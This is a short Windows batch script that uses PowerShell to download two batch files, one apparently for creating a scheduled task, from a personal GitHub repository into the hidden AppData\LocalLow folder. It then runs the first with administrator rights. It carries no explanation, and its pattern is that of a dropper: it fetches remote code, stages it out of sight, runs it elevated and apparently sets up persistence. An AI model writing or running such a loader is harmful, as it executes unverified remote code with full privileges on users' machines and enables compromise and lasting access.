@echo off

	powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/setup.bat', '%USERPROFILE%\AppData\LocalLow\setup.bat')"
	powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/create_task.bat', '%USERPROFILE%\AppData\LocalLow\create_task.bat')"
	powershell -Command "Start-Process '%USERPROFILE%\AppData\LocalLow\setup.bat' -Verb runAs"
	exit /b 0